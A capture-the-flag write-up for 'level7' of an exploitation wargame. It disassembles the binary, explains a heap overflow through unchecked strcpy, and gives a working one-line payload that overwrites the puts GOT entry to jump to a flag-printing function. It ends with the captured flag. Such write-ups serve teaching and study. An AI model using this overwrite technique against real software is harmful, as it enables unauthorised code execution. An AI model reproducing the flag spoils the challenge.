<span style="display: flex; justify-content: space-between;"><span style="text-align: left; display: block;">
	[← level6](../level6/solution.md)
</span>
<span style="text-align: center; display: block;">
	[Home](../README.md)
</span>
<span style="text-align: right; display: block;">
	[level8 →](../level8/solution.md)
</span>
</span>

level7
======

Dissassembly
------------

To dissassemble the executable we can use objdump.
```sh
EXECUTABLE=./level7

objdump -M intel -d "$EXECUTABLE"
```

Let's look at the main function:
```nasm
08048521 <main>:
 8048521:	55                   	push   ebp
 8048522:	89 e5                	mov    ebp,esp
 8048524:	83 e4 f0             	and    esp,0xfffffff0
 8048527:	83 ec 20             	sub    esp,0x20
...
```

There are 4 calls to malloc. Each one has a size of 8 bytes.
I'll refer to them as block A, B, C and D.
```nasm
...
A:
 804852a:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 8048531:	e8 ba fe ff ff       	call   80483f0 <malloc@plt>
 8048536:	89 44 24 1c          	mov    DWORD PTR [esp+0x1c],eax
 804853a:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 804853e:	c7 00 01 00 00 00    	mov    DWORD PTR [eax],0x1
B:
 8048544:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 804854b:	e8 a0 fe ff ff       	call   80483f0 <malloc@plt>
 8048550:	89 c2                	mov    edx,eax
 8048552:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048556:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
C:
 8048559:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 8048560:	e8 8b fe ff ff       	call   80483f0 <malloc@plt>
 8048565:	89 44 24 18          	mov    DWORD PTR [esp+0x18],eax
 8048569:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 804856d:	c7 00 02 00 00 00    	mov    DWORD PTR [eax],0x2
D:
 8048573:	c7 04 24 08 00 00 00 	mov    DWORD PTR [esp],0x8
 804857a:	e8 71 fe ff ff       	call   80483f0 <malloc@plt>
 804857f:	89 c2                	mov    edx,eax
 8048581:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 8048585:	89 50 04             	mov    DWORD PTR [eax+0x4],edx
...
```

The pointers to block A and C are stored at esp + 0x1c and esp + 0x18 respectively.
On the other hand, the pointers to block B and D are stored inside of block A and C respectively at an offset of 4.
```c
A:
[esp + 0x1c] = malloc(8);
[[esp + 0x1c]] = 1;

B:
[[esp + 0x1c] + 0x4] = malloc(8);

C:
[esp + 0x18] = malloc(8);
[[esp + 0x18]] = 2;

D:
[[esp + 0x18] + 0x4] = malloc(8);
```

Afterwards, the content of the strings at [[ebp+0xc] + 0x4] and [[ebp+0xc] + 0x8] is copied to block B and D respectively.
```nasm
...
 8048588:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804858b:	83 c0 04             	add    eax,0x4
 804858e:	8b 00                	mov    eax,DWORD PTR [eax]
 8048590:	89 c2                	mov    edx,eax

 8048592:	8b 44 24 1c          	mov    eax,DWORD PTR [esp+0x1c]
 8048596:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]

 8048599:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804859d:	89 04 24             	mov    DWORD PTR [esp],eax
 80485a0:	e8 3b fe ff ff       	call   80483e0 <strcpy@plt>

 80485a5:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 80485a8:	83 c0 08             	add    eax,0x8
 80485ab:	8b 00                	mov    eax,DWORD PTR [eax]
 80485ad:	89 c2                	mov    edx,eax

 80485af:	8b 44 24 18          	mov    eax,DWORD PTR [esp+0x18]
 80485b3:	8b 40 04             	mov    eax,DWORD PTR [eax+0x4]

 80485b6:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80485ba:	89 04 24             	mov    DWORD PTR [esp],eax
 80485bd:	e8 1e fe ff ff       	call   80483e0 <strcpy@plt>
...
```

[ebp+0xc] is the location of the execution arguments array, so [[ebp+0xc] + 0x4] and [[ebp+0xc] + 0x8] correspond to the 1st and 2nd arguments respectively.

In c, the procedure would look like this:
```c
void **A = malloc(8);
void *B = malloc(8);
void **C = malloc(8);
void *D = malloc(8);

A[0] = 1;
A[1] = B;

C[0] = 2;
C[1] = D;

strcpy(A[1], av[1]); // A[1] == B
strcpy(C[1], av[2]); // C[1] == D
```

Lastly, the file containing the flag is opened in read-only mode and loaded into a buffer at 0x8049960. There also is a call to puts, but it simply prints "~~".
```nasm
 80485c2:	ba e9 86 04 08       	mov    edx,0x80486e9				; "r"
 80485c7:	b8 eb 86 04 08       	mov    eax,0x80486eb				; "/home/user/level8/.pass"
 80485cc:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 80485d0:	89 04 24             	mov    DWORD PTR [esp],eax
 80485d3:	e8 58 fe ff ff       	call   8048430 <fopen@plt>
 80485d8:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 80485dc:	c7 44 24 04 44 00 00 	mov    DWORD PTR [esp+0x4],0x44
 80485e3:	00
 80485e4:	c7 04 24 60 99 04 08 	mov    DWORD PTR [esp],0x8049960
 80485eb:	e8 d0 fd ff ff       	call   80483c0 <fgets@plt>
 80485f0:	c7 04 24 03 87 04 08 	mov    DWORD PTR [esp],0x8048703	; "~~"
 80485f7:	e8 04 fe ff ff       	call   8048400 <puts@plt>
 80485fc:	b8 00 00 00 00       	mov    eax,0x0
 8048601:	c9                   	leave
 8048602:	c3                   	ret
```
Note: To find strings corresponding to each memory location, you can use readelf:
```sh
readelf --hex-dump=.rodata ./level7
```

There also is a function m that will print the buffer containing the flag, as well as the current time.
```nasm
080484f4 <m>:
 80484f4:	55						push   ebp
 80484f5:	89 e5					mov    ebp,esp
 80484f7:	83 ec 18				sub    esp,0x18
 80484fa:	c7 04 24 00 00 00 00	mov    DWORD PTR [esp],0x0
 8048501:	e8 ca fe ff ff			call   80483d0 <time@plt>
 8048506:	ba e0 86 04 08			mov    edx,0x80486e0
 804850b:	89 44 24 08				mov    DWORD PTR [esp+0x8],eax
 804850f:	c7 44 24 04 60 99 04	mov    DWORD PTR [esp+0x4],0x8049960
 8048516:	08
 8048517:	89 14 24				mov    DWORD PTR [esp],edx
 804851a:	e8 91 fe ff ff			call   80483b0 <printf@plt>
 804851f:	c9						leave
 8048520:	c3						ret
```

Exploitation
------------

We need to jump onto the m function after the fgets call.
Because the executable is dynamically linked and calls the puts stub after reading the flag, we could override the function pointer with the address of the m function.
```nasm
08048400 <puts@plt>:
 8048400:	ff 25 28 99 04 08		jmp    DWORD PTR ds:0x8049928
 8048406:	68 28 00 00 00			push   0x28
 804840b:	e9 90 ff ff ff			jmp    80483a0 <_init+0x34>
```

To do so we can exploit strcpy again, because no length checks are performed on the input strings.
```c
strcpy(B, av[1]);
strcpy(C[1], av[2]);
```
The memory layout looks like this:
|   A  |      |   B  |      |   C  |      |   D  |      |
|:----:|------|:----:|------|:----:|------|:----:|------|
| 0x00 | 0x08 | 0x10 | 0x18 | 0x20 | 0x28 | 0x30 | 0x38 |

On 32 bits systems with 4 byte size_t, the libc's minimal allocation size is 16 bytes and contains 4 bytes of overhead, and padding if necessary.
That means that we should have 8 bytes of space between our blocks.

If we copy the address of the puts function pointer into C[1], we can overwrite it with the content of the second argument.
To do so, we will need to supply a string long enough to reach C[1], starting at B.

```c
&C[1] - B = 0x24 - 0x10 = 0x14 = 20
```

Now, let's try to override the puts stub function pointer:
```sh
./level7 "$(printf %.0sA {1..20})"$'\x28\x99\x04\x08' $'\xf4\x84\x04\x08'
```

Bingo!
```sh
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1648054124
```
